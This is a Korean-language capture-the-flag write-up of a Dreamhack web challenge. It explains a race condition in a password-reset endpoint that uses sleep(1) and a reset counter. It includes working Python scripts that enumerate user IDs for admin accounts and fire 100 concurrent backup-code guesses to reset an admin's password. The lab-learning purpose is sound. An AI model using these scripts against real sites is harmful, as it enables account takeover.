created: 2026-01-28 20:00
category: #web 
link: https://dreamhack.io/wargame/challenges/47

# Write-up
`/login`
- POST, `userid`, `password`
- `password`를 sha256으로 해시화한다. 따라서 브루트 포스로 뚫기도 어려워보임.

`/register`
- POST, `userid`, `password`, `name` 

```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";
```
- `/forgot_password`
- POST, `userid`, `newpassword`, `backupCode`
- 비밀번호를 수정하는 API이다. `resetCount`가 설정되어 있어 5번 틀리면 더 이상 시도할 수 없다.
- 심지어 브루트 포스 방지를 위해 `sleep(1)`까지 설정되어 있다.
- 하지만, 댓글 힌트를 보고 해당 `sleep(1)`을 역이용해 오히려 Race condition 공격을 시도할 수 있다는 것을 깨달았다. 

`/user/<int:useridx>`
- `/register` API 코드를 보면 딱히 `idx`와 관련된 코드가 없다 -> auto increment일 가능성이 있음.
- 그러면 일단 아무 계정이나 만들어서 해당 계정의 `idx`를 확인하고, 그 이전 `idx`들을 모두 조회하면?

`/admin`
- `session['level']`이 "admin"이라면 플래그 반환.

새 계정을 만들어보니 `idx`가 17로 확인되었다.
따라서 1부터 16까지 계정들을 `/user/<int:useridx>` API로 모두 확인해보았다. 작은 숫자라서 직접 수동으로 확인해도 되지만, exploit 코드를 작성해보았다.
```python
import requests

url = "http://host3.dreamhack.games:23973/user/"
for i in range(1, 17):
    response = requests.get(url + str(i))
    if "UserLevel: 1" in response.text:
        print(i)

```
그 결과로 UserLevel이 "admin"인 계정들은 다음과 같았다.
- 1: Apple, Apple
- 5: Dog, Dog
- 8: coconut, coconut
- 9: lemon, lemon
- 10: potato, potato
- 13: peach, peach
- 14: orange, orange

`/forgot_password` API에서 1초 기다리는 것을 역이용해 Race condition 공격을 시도한다.
`backupCode`의 범위가 0 ~ 99인 것을 활용해 100개의 요청을 한 번에 전송한다. 그에 따라 1초 기다리는 것 때문에 요청 대부분이 `resetCount`가 0인 상태로 시작할 것이다.
따라서 5번 실패하는 것 까지 가지 않고도 `backupCode`를 맞추어 비밀번호 수정까지 성공할 수 있다.
![[Pasted image 20260128231257.png|700]]
- 위 이미지의 상황과 비슷하다. 

```python
import aiohttp
import asyncio


userid = "Dog"
newpassword = "test"


async def send_post(session, url, data):
    async with session.post(url, data=data) as response:
        result = await response.text()
        if "Wrong" not in result:
            print(result)
        return result


async def main():
    url = "http://host3.dreamhack.games:23973/forgot_password"
    tasks = []

    async with aiohttp.ClientSession() as session:
        for backupCode in range(0, 100):
            payload = {
                "userid": userid,
                "newpassword": newpassword,
                "backupCode": backupCode,
            }
            tasks.append(send_post(session, url, payload))

        # 모든 태스크를 동시에 실행하고 결과를 기다림
        responses = await asyncio.gather(*tasks)
        print(f"전체 요청 완료: {len(responses)}개")


asyncio.run(main())
```
- 우선 한 번에 여러 번 request를 보내야 Race condition 공격에 성공할 수 있으므로 요청을 동기적으로 전송하면 안된다. 그래서 파이썬의 `aiohttp` 라이브러리를 사용하였다. 
- 해당 라이브러리를 사용하여 100개의 요청을 비동기로 보내고 대기하는 방법을 사용하였다.
- `userid`로 위에서 확인했던 "admin" 계정 중 아무거나 하나를 사용했다. `newpassword`는 간단하게 "test"로 초기화했다.

![[Pasted image 20260128231558.png|700]]
코드를 실행한 결과는 위 이미지와 같다. 비밀번호 변경에 성공한 것을 확인할 수 있다. 

여기서 "Dog" 게정에 비밀번호가 "test"로 바뀌었고, 로그인에 성공할 수 있었다. 이후, `/admin`으로 접속하여 정상적으로 플래그를 획득할 수 있었다.

# Reference
- https://docs.aiohttp.org/en/stable/
- https://jimmy-ai.tistory.com/396
- https://en.wikipedia.org/wiki/Race_condition
- https://portswigger.net/web-security/race-conditions